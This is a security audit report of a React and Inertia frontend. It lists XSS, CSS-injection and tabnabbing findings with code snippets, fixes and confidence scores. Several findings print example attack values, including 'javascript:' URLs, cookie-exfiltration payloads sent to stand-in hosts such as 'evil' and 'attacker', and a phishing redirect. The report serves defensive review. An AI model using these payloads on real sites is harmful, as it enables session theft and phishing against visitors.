# React Frontend Audit

Scope: `resources/js/**` of personality-platform (React 18 + Inertia 1 + MUI 7 + react-quill-new). Confirmed issues only — file:line + snippet for each.

## Critical

_None confirmed in scope._ The raw-HTML render callsites (the React property whose name starts with "dangerously") all funnel through `sanitizeHtml()` from `resources/js/utils/sanitize.js`, which delegates to `isomorphic-dompurify` (default profile, no `ADD_TAGS`/`ALLOWED_URI_REGEXP` overrides), so stored XSS via the rich-text body field is blocked at render time. The `javascript:` URL gap below would normally be Critical, but DOMPurify's default URI policy still strips `javascript:` from anchors that go through it — the gap is in *non-sanitised* anchor `href` bindings (URLs, not HTML), tracked under High.

## High

### F1.1 — Unvalidated user URL becomes anchor `href` (DOM-XSS via `javascript:` scheme)

- File: `resources/js/Components/Blocks/HeroBanner.jsx:88-91, 372-375`
- Code:
  ```jsx
  <Button component={InertiaLink} href={ctaLink} ... >  // line 89
  // and:
  {...(secondaryCtaLink && (secondaryCtaLink.startsWith('http')
      ? { component: 'a', href: secondaryCtaLink, target: '_blank', rel: 'noopener noreferrer' }
      : { component: InertiaLink, href: secondaryCtaLink }))}
  ```
- Issue: `ctaLink` and `secondaryCtaLink` come straight from `block.content.cta_link` / `block.content.secondary_cta_link` (admin-editable JSON, see `Pages/Admin/PageBlocks/Form.jsx`). The `startsWith('http')` branch only switches between `<a>` and `InertiaLink`; it does not reject `javascript:`, `data:text/html`, or `vbscript:`. InertiaLink renders a plain `<a href={url}>`, so a saved value like `javascript:fetch('/admin/users')...` becomes a clickable XSS gadget for every visitor of the page.
- Exploit: An attacker with editor role saves `javascript:alert(document.cookie)` as the hero CTA. Any visitor clicking the hero button executes the script in the site origin — escalates editor to admin via session theft / CSRF chaining.
- Fix: Add a URL allow-list helper in `utils/sanitize.js` and apply at every block CTA render:
  ```js
  // utils/sanitize.js
  export function safeUrl(raw) {
    if (!raw || typeof raw !== 'string') return '#';
    const trimmed = raw.trim();
    if (/^(javascript|data|vbscript|file):/i.test(trimmed)) return '#';
    if (/^(https?:\/\/|\/|#|mailto:|tel:)/i.test(trimmed)) return trimmed;
    return '#';
  }
  ```
  Then `href={safeUrl(ctaLink)}` everywhere.
- Confidence: 9/10

### F1.2 — Same `javascript:` gap on platform-CTA, books, logo-grid, social, navigation, footer, header CTA

- File: `resources/js/Components/Blocks/PlatformCta.jsx:34-36`, `Components/Blocks/BooksGrid.jsx:144`, `Components/Blocks/SocialMediaFeed.jsx:81`, `Components/Blocks/LogoGrid.jsx:111`, `Components/Blocks/PillarCards.jsx:189`, `Layouts/PublicLayout.jsx:79, 105, 137-165, 681, 787, 848`
- Code (illustrative):
  ```jsx
  // PlatformCta.jsx:34
  ...(ctaLink && (ctaLink.startsWith('http')
      ? { component: 'a', href: ctaLink, ... }
      : { component: InertiaLink, href: ctaLink }))
  // PublicLayout.jsx:677-681
  component: (headerCtaUrl || '').startsWith('http') ? 'a' : InertiaLink,
  href: headerCtaUrl || '#',
  // PublicLayout.jsx:74-79  (NavLink)
  const isExternal = url.startsWith("http://") || url.startsWith("https://");
  if (isExternal || item.target === "_blank") return <MuiLink href={url} ...>
  ```
- Issue: All of these consume admin-editable URL fields (`book.buy_link`, `acc.url`, `logo.link`, `card.link`, `headerCtaUrl` from settings, `item.url` from `NavigationItem`s, footer column links). The startsWith('http') gate is a *routing* decision, not a *safety* check. A `java`+`script:` payload skips the http branch and is rendered raw. Notably, `NavLink` (line 79) wraps `MuiLink` around `href={url}` without any scheme check whatsoever when `target === "_blank"`.
- Exploit: identical to F1.1 — admin-editable navigation, social, or buy_link becomes a stored DOM-XSS vector that fires on click for every visitor.
- Fix: Run every external-href binding through the `safeUrl()` helper from F1.1. Replace `href={url}` with `href={safeUrl(url)}` and tighten the test to `^https?://` for the "is external" decision.
- Confidence: 9/10

### F1.3 — CSS `url()` interpolation accepts unvalidated user input → CSS injection / data exfil

- File: `resources/js/Components/Blocks/PlatformCta.jsx:82`, `Components/Blocks/StatsCounter.jsx:28`
- Code:
  ```jsx
  // PlatformCta.jsx
  backgroundImage: `url(${patternUrl})`,
  // StatsCounter.jsx
  backgroundImage: bgImage ? `url(${bgImage})` : undefined,
  ```
- Issue: `patternUrl` (`content.pattern_image_url`) and `bgImage` (`content.background_image_url`) are admin-editable strings used inside a CSS template literal with no validation. A value such as `x); } body { background:url('//evil/?c='+document.cookie); } /*` may break out of the property when MUI inlines it, leaking cookies through DNS/HTTP exfil. Even without breakout, an attacker can point `url(...)` at an attacker-controlled origin to track every page view (referer + IP). Note: `QuranVerse.jsx:331` already implements the right pattern (`/^(https?:\/\/|\/)/.test(rawBgImage)`); the other two blocks omit it.
- Exploit: Editor sets `pattern_image_url = "x'); } body { background-image: url('https://attacker/?c=' attr(class)); } ('"`. MUI emits the broken CSS into a stylesheet; modern browsers accept additional rules and the attacker collects a beacon for every authenticated session that views the page.
- Fix: Reuse the URL whitelist from `QuranVerse.jsx:331` in a shared helper:
  ```js
  // utils/sanitize.js
  export function safeBackgroundUrl(raw) {
    return raw && /^(https?:\/\/|\/)[^"')\\]*$/.test(raw) ? raw : null;
  }
  ```
  Quote the URL inside `url("…")` and reject anything containing `"`, `'`, `)`, or `\`.
- Confidence: 8/10

### F1.4 — `MediaPicker` renders `<img src={value}>` from any user-pasted URL with no scheme check; SVG upload allowed

- File: `resources/js/Components/MediaPicker.jsx:50-53, 113-118, 144-161, 192-194`
- Code:
  ```jsx
  <TextField onChange={(e) => onChange(e.target.value)} ... />
  // ...
  <Box component="img" src={value} ... />
  // helper text on line 193:
  // "JPEG, PNG, GIF, WebP, or SVG · max 10 MB"
  ```
- Issue: Two sub-issues:
  1. The `<TextField>` accepts *any* user-typed string (including `data:` URLs) and immediately mounts it as `<img src={value}>`. While `<img>` will not execute scripts on its own, `data:image/svg+xml;base64,...` becomes a script-execution sink if any consumer later renders the same URL through `<object data=…>` or `<iframe>`.
  2. The upload POST (line 77-86) only validates MIME on the client (`accept="image/*"`). The helper text on line 193 explicitly advertises that **SVG is allowed**, and SVG can carry inline scripts via `<svg onload=...>`.
- Exploit: Editor uploads a malicious SVG via the picker, then references it in any future block that renders SVG via `<object>`/`<iframe>`/raw HTML embed. Today's blocks all use `<img>` so it is latent; tomorrow's may not be.
- Fix: (a) Validate `value` in `MediaPicker` with `safeUrl()` before rendering the preview; (b) Server side, force `Content-Type: image/svg+xml` to be served with `Content-Disposition: attachment` OR sanitise SVG with DOMPurify in `image/svg+xml` mode at upload time; (c) reject SVG uploads from non-admin users; (d) re-validate MIME server-side via `finfo_file`, not the trusted client header.
- Confidence: 7/10 (sub-issue 1 confirmed in JS; sub-issue 2 needs backend audit confirmation — flag for the backend agent).

## Medium

### F2.1 — Quill `RichTextEditor` returns user-typed HTML to form state with no client-side sanitisation before save

- File: `resources/js/Components/RichTextEditor.jsx:74-81`, callers `Pages/Admin/PageBlocks/Form.jsx:394`, `Pages/Admin/Settings/Edit.jsx:213`, `Pages/Admin/ContentItems/Form.jsx:268`
- Code:
  ```jsx
  const handleChange = useCallback(
      (content, _delta, source) => {
          if (source === 'user') {
              onChange(content);   // raw Quill HTML → form state → POST to backend
          }
      }, [onChange]);
  ```
- Issue: Quill's output is raw HTML. The frontend posts it unsanitised to the backend; correctness depends entirely on server-side DOMPurify-equivalent in PHP (e.g. `mews/purifier` or `voku/anti-xss`) before it lands in the DB. Render-time sanitisation via `sanitizeHtml()` is in place, **but** if any other consumer reads the field without going through `sanitizeHtml()` (e.g. an export, a feed, or an email template), the stored XSS fires. Defence-in-depth requires sanitising on **save** too.
- Exploit: Editor types `<img src=x onerror=fetch('/x')>` in the rich-text editor. If a future component renders that field interpolated into a string that ends up unescaped (e.g. an RSS feed XML body, a sitemap, or a search index excerpt), it fires.
- Fix: Pass the value through `sanitizeHtml()` inside the Quill `onChange` handler before calling parent `onChange`, OR ensure backend uses HtmlPurifier in the controller `update`/`store` methods. The first option is also a UX win.
- Confidence: 7/10

### F2.2 — Inertia shared `auth.user` exposes `email` and `email_verified_at` on every page

- File: `app/Http/Middleware/HandleInertiaRequests.php:52-61` (out-of-scope but materially affects frontend trust boundary)
- Code:
  ```php
  "auth" => [
      "user" => $request->user() ? [
          "id" => ..., "name" => ..., "email" => ..., "email_verified_at" => ...,
      ] : null,
  ],
  ```
- Issue: The user's own email is included in the Inertia `props` JSON of every page. That JSON is embedded into `data-page` on `<div id="app">` in `app.blade.php`. Anyone with read access to a *cached* HTML page (CDN, browser back-button, screenshot of HTML via support ticket, server-side log scraping) sees the admin email in plaintext, even on pages where it is not displayed. Plus, every block component, every QA harness, and every E2E test sees the email — increasing the attack surface for accidental log/telemetry leaks.
- Exploit: Admin shares a screenshot of the page DOM in a bug report → admin email harvested for phishing. Or: a misconfigured CDN caches the HTML and serves the admin's email to other admins.
- Fix: Drop `email`/`email_verified_at` from the shared `auth.user` array. Only the `name` is read in the frontend (`PublicLayout.jsx:702`, `AdminLayout.jsx:359`); fetch email lazily on the profile page only.
- Confidence: 9/10

### F2.3 — `sanitizeHtml()` uses default DOMPurify config — `target="_blank"` links from rich text are emitted without `rel="noopener"`

- File: `resources/js/utils/sanitize.js:11-14`
- Code:
  ```js
  return DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });
  ```
- Issue: DOMPurify's default config preserves `<a target="_blank">` but does **not** force `rel="noopener noreferrer"`. Any rich-text author can paste `<a href="https://evil/" target="_blank">click</a>`; the rendered link gets `window.opener` access to the parent (reverse tabnabbing). DOMPurify exposes the `afterSanitizeAttributes` hook precisely for this.
- Exploit: Editor pastes a link to a malicious page; visitor clicks; attacker page calls `window.opener.location = 'https://phish.example/login'` and steals credentials.
- Fix:
  ```js
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName === 'A' && node.getAttribute('target') === '_blank') {
      node.setAttribute('rel', 'noopener noreferrer');
    }
  });
  ```
  Add this hook once at module top-level in `utils/sanitize.js`.
- Confidence: 9/10

### F2.4 — `fetch()` to `admin.pages.blocks.reorder` omits explicit `credentials` flag

- File: `resources/js/Pages/Admin/Pages/Form.jsx:105-117`
- Code:
  ```jsx
  fetch(route('admin.pages.blocks.reorder', page.id), {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json',
          'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content'),
          'Accept': 'application/json',
          'X-Requested-With': 'XMLHttpRequest',
      },
      body: JSON.stringify({ blocks: reordered }),
  })
  ```
- Issue: This call omits `credentials: 'same-origin'` (other code paths in `MediaPicker` set it explicitly). On Chrome/Firefox the default for same-origin fetch is `same-origin` so it works, but the inconsistency is a footgun: if the route ever moves to a subdomain or the call is copy-pasted into a cross-origin context, the cookie won't go and the developer will "fix" it by adding `credentials: 'include'` — at which point you have a CSRF problem.
- Fix: Add `credentials: 'same-origin'` for consistency with `MediaPicker.jsx:52, 80`. Or migrate this call to `router.post(route(...))` which Inertia handles uniformly.
- Confidence: 6/10

## Low

### F3.1 — `localStorage` used for cookie-consent state

- File: `resources/js/Components/CookieConsentBanner.jsx:15, 23`
- Code:
  ```js
  const consentStatus = localStorage.getItem(consentKey);
  localStorage.setItem(consentKey, status);
  ```
- Issue: The checklist forbids tokens in localStorage. Cookie-consent is **not** a token, so this is in spec. Flagged for completeness only — confirm no JWT/access-token ever migrates here.
- Confidence: 10/10 (acceptable, no fix required)

### F3.2 — `MuiLink href={url}` in `PublicLayout.jsx:79` (NavLink, external branch) does not set `rel` when URL is external but `item.target` is undefined

- File: `resources/js/Layouts/PublicLayout.jsx:60-82`
- Code:
  ```jsx
  rel: item.target === "_blank" ? "noopener noreferrer" : undefined,
  // ...
  if (isExternal || item.target === "_blank") {
      return <MuiLink href={url} {...commonProps}>...</MuiLink>;
  }
  ```
- Issue: When `isExternal` is true but `item.target` is undefined, no `rel` is applied. External same-tab links don't have `window.opener` issues, so this is informational, not exploitable. But `noopener` should still be set on all external links for performance.
- Fix: `rel: isExternal ? "noopener noreferrer" : undefined`.
- Confidence: 8/10

### F3.3 — `PublicLayout.jsx:737` — `<Container>` wraps `{children}` directly without ErrorBoundary

- File: `resources/js/Layouts/PublicLayout.jsx:734-740`
- Issue: Not a security finding per checklist — but a render-time exception in any block (e.g. `JSON.parse` in resolved data) bubbles up and can expose React stack traces in dev mode. In production with `app.debug=false` this is fine; flagged because the audit checklist mentions "fail securely". Not actionable.
- Confidence: 5/10 (informational)

## Clean

- All 10 raw-HTML render callsites route through `sanitizeHtml()` (`HeroBanner` × 3, `ScholarCards`, `TextWithImage`, `StatsCounter`, `PlatformCta`, `RichTextBlock`, `Pages/Content/ShowItem.jsx`). DOMPurify default profile blocks `<script>`, `on*` handlers, and `java`+`script:` URIs in HTML.
- `sanitize.js` — no `ADD_TAGS`, no relaxed `ALLOWED_URI_REGEXP`, no `RETURN_TRUSTED_TYPE: false` override. Safe baseline (gap on `target=_blank` links is F2.3).
- No `eval`, no dynamic-string `setTimeout`/`setInterval`, no Function-constructor usage anywhere in `resources/js/**`.
- No lodash `_.merge`, `_.set`, `Object.assign(target, ...userJSON)` prototype-pollution sinks.
- No `window.open(userUrl)` callsites.
- CSRF is read from `meta[name="csrf-token"]` on every JSON POST in `MediaPicker.jsx:75-83` and `Pages/Admin/Pages/Form.jsx:107-110`. `bootstrap.js:10` sets `X-Requested-With: XMLHttpRequest` globally on axios. Inertia handles CSRF + cookies natively.
- `QuranVerse.jsx:330-331` already validates `background_image_url` against `^(https?://|/)`. Use as the model for fixing F1.3.
- All admin Inertia POSTs use the Inertia `useForm` / `router.post` helper which sends the `XSRF-TOKEN` cookie automatically.
- `localStorage` only stores the cookie-consent string (F3.1). No tokens, no PII.

---

## Summary

- Critical: 0 · High: 4 · Medium: 4 · Low: 3 · Clean: 8 categories
- Top 3 finding IDs: F1.1 (`java`+`script:` URL in HeroBanner CTA), F1.2 (same gap in 8+ other anchor sites), F1.3 (CSS `url()` injection in 2 blocks).
- Single root cause across F1.1 and F1.2: the codebase consistently confuses *routing* (`startsWith('http')` → `<a>` vs `InertiaLink`) with *safety* (scheme rejection). One shared `safeUrl()` helper in `utils/sanitize.js` plus a search-and-replace fixes both findings in one PR.
- Recommended next action: ship the `safeUrl()` + `safeBackgroundUrl()` helpers, audit-fix every `href={var}` and `url(${var})` callsite in the codebase, then add an ESLint rule (or grep-based pre-commit hook) that bans bare `href={` and `url(${` patterns outside `utils/sanitize.js`.
- The frontend's render-time XSS posture (DOMPurify) is solid; the gap is on URL fields and `<a target="_blank">` `rel` enforcement (F2.3) — both fixed in DOMPurify with a single `afterSanitizeAttributes` hook.
